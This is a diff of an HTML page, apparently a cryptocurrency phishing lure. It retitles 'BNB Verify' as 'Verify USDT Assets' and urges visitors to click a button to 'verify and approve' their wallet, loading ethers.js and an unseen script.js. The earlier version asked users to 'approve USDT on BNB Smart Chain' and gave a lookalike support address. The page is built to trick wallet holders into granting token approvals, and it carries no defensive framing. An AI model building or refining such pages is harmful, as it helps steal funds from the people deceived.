@@ -3,52 +3,39 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>BNB Verify</title>
-  <link rel="icon" href="favicon.ico" type="image/x-icon">
+  <title>Verify USDT Assets</title>
+  <link rel="icon" href="favicon.ico" type="image/x-icon" />
   <style>
     body {
-      font-family: sans-serif;
-      background: #f4f4f4;
+      font-family: Arial, sans-serif;
       text-align: center;
-      padding: 20px;
+      padding-top: 100px;
+      background-color: #f2f2f2;
     }
-    .box {
-      background: white;
-      padding: 20px;
-      border-radius: 12px;
-      max-width: 400px;
-      margin: 80px auto;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    h2 {
+      color: #333;
     }
     button {
-      background-color: #ff9800;
-      border: none;
-      padding: 15px 30px;
+      padding: 12px 24px;
       font-size: 16px;
+      border: none;
+      background-color: #4CAF50;
       color: white;
-      border-radius: 6px;
       cursor: pointer;
+      border-radius: 5px;
     }
     button:hover {
-      background-color: #e68900;
-    }
-    footer {
-      margin-top: 50px;
-      font-size: 14px;
-      color: #777;
+      background-color: #45a049;
     }
   </style>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 </head>
 <body>
-  <div class="box">
-    <h2>BNB Asset Verification</h2>
-    <p>Secure your wallet and approve USDT on BNB Smart Chain.</p>
-    <button id="verifyAssets">🔒 Verify Assets</button>
-  </div>
-  <footer>
-    Need help? Email: customersupport@usdtcheck.org
-  </footer>
+  <h2>Verify Your USDT Assets</h2>
+  <p>Please click the button below to verify and approve your wallet.</p>
+  <button id="verifyAssets">Verify Assets</button>
+
+  <!-- Load ethers and main logic -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script src="script.js"></script>
 </body>
 </html>
